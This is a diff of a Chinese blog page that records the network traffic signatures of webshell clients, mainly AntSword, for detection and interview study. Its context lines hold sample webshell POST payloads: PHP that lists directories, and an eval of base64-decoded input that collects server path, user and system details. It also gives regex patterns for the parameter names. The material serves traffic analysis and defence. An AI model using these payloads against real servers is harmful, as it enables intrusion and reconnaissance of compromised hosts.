@@ -33,7 +33,7 @@
 <meta property="og:description" content="看到一堆面试题都有涉及到后门客户端的流量特征，这里自己作一些记录">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-03-11T13:36:09.000Z">
-<meta property="article:modified_time" content="2021-03-14T06:28:33.477Z">
+<meta property="article:modified_time" content="2021-03-14T06:33:50.955Z">
 <meta property="article:author" content="xXxYOLOxXx">
 <meta property="article:tag" content="WebShell">
 <meta property="article:tag" content="Traffic_Analysis">
@@ -210,7 +210,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-14 14:28:33" itemprop="dateModified" datetime="2021-03-14T14:28:33+08:00">2021-03-14</time>
+                <time title="Modified: 2021-03-14 14:33:50" itemprop="dateModified" datetime="2021-03-14T14:33:50+08:00">2021-03-14</time>
               </span>
 
           
@@ -240,7 +240,7 @@
 <h2 id="流量特征"><a class="markdownIt-Anchor" href="#流量特征"></a> 流量特征</h2>
 <p>QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jz…</p>
 <h1 id="蚁剑"><a class="markdownIt-Anchor" href="#蚁剑"></a> 蚁剑</h1>
-<p>蚁剑默认不使用任何编码</p>
+<p>default</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;7a5cd&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;7a6ba&quot;</span>;&#125;ob_start();<span class="keyword">try</span>&#123;<span class="variable">$D</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;0x89edb44048ea7&quot;</span>]);<span class="variable">$F</span>=@opendir(<span class="variable">$D</span>);<span class="keyword">if</span>(<span class="variable">$F</span>==<span class="literal">NULL</span>)&#123;<span class="keyword">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$M</span>=<span class="literal">NULL</span>;<span class="variable">$L</span>=<span class="literal">NULL</span>;<span class="keyword">while</span>(<span class="variable">$N</span>=@readdir(<span class="variable">$F</span>))&#123;<span class="variable">$P</span>=<span class="variable">$D</span>.<span class="variable">$N</span>;<span class="variable">$T</span>=@date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>,@filemtime(<span class="variable">$P</span>));@<span class="variable">$E</span>=substr(base_convert(@fileperms(<span class="variable">$P</span>),<span class="number">10</span>,<span class="number">8</span>),<span class="number">-4</span>);<span class="variable">$R</span>=<span class="string">&quot;	&quot;</span>.<span class="variable">$T</span>.<span class="string">&quot;	&quot;</span>.@filesize(<span class="variable">$P</span>).<span class="string">&quot;	&quot;</span>.<span class="variable">$E</span>.<span class="string">&quot;&quot;</span>;<span class="keyword">if</span>(@is_dir(<span class="variable">$P</span>))<span class="variable">$M</span>.=<span class="variable">$N</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$R</span>;<span class="keyword">else</span> <span class="variable">$L</span>.=<span class="variable">$N</span>.<span class="variable">$R</span>;&#125;<span class="keyword">echo</span> <span class="variable">$M</span>.<span class="variable">$L</span>;@closedir(<span class="variable">$F</span>);&#125;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
 <p>base64</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pass=@<span class="keyword">eval</span>(@base64_decode(<span class="variable">$_POST</span>[_0xc1ac917e3ce47]));</span><br><span class="line">_0xc1ac917e3ce47=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiNmFlNjEiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImU5YTAwIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs=</span><br></pre></td></tr></table></figure>
@@ -253,8 +253,8 @@
 <h2 id="参数特征-2"><a class="markdownIt-Anchor" href="#参数特征-2"></a> 参数特征</h2>
 <p>POST:</p>
 <ul>
-<li>无编码 &amp; chr编码: <code>0x[0-9a-f]&#123;13&#125;</code></li>
-<li>Base64编码 &amp; ROT13: <code>_0x[0-9a-f]&#123;13&#125;</code></li>
+<li>default &amp; chr &amp; chr16: <code>0x[0-9a-f]&#123;13&#125;</code></li>
+<li>base64 &amp; rot13: <code>_0x[0-9a-f]&#123;13&#125;</code></li>
 </ul>
 <h2 id="流量特征-2"><a class="markdownIt-Anchor" href="#流量特征-2"></a> 流量特征</h2>
 <p>default: @ini_set(“display_errors”,“0”);…<br />
